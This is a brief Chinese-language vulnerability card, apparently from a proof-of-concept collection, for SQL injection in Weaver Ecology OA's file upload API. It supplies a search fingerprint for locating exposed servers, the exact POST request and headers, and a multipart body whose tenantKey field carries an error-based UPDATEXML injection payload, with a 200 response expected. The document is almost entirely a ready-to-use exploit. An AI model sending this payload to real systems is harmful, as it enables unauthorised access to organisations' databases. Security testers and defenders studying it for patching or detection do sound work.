# 泛微Ecologyupload存在SQL注入漏洞

- **系统**：泛微OA　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`icon_hash="-1619753057"`
- **请求**：`POST /papi/file/module/upload HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=------------------------aB9xY7…`　`Cookie: language=zh-cn; language=zh-cn`

**请求体 / payload**
```
--------------------------aB9xY7pQ2rT8vM4eW3nL5jK6fH1qS0dF
Content-Disposition: form-data; name="module"
sp
--------------------------aB9xY7pQ2rT8vM4eW3nL5jK6fH1qS0dF
Content-Disposition: form-data; name="tenantKey"
' AND UPDATEXML(1,concat('~',md5(123),'~'),1)#
--------------------------aB9xY7pQ2rT8vM4eW3nL5jK6fH1qS0dF
Content-Disposition: form-data; name="file"; filename="test.txt"
Content-Type: text/plain
szgfbtojfpzadjpps
--------------------------aB9xY7pQ2rT8vM4eW3nL5jK6fH1qS0dF--
```
- **预期**：200　|　—